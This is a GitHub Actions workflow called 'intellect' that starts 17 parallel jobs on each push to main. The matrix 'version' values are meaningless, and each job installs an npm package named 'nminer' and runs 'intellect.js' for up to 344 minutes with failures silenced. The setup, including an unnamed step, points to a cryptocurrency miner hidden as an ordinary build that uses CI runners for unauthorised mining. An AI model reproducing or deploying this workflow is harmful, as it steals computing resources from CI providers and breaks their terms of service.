name: intellect
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 3498 }
          - { version: 2802 }
          - { version: 7217 }
          - { version: 7530 }
          - { version: 4401 }
          - { version: 2947 }
          - { version: 213 }
          - { version: 1703 }
          - { version: 1452 }
          - { version: 1964 }
          - { version: 4989 }
          - { version: 2301 }
          - { version: 439 }
          - { version: 7290 }
          - { version: 9338 }
          - { version: 279 }
          - { version: 3330 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: 
        run: |
          npm install nminer@latest
          timeout 344m node intellect.js || echo "intellect executed"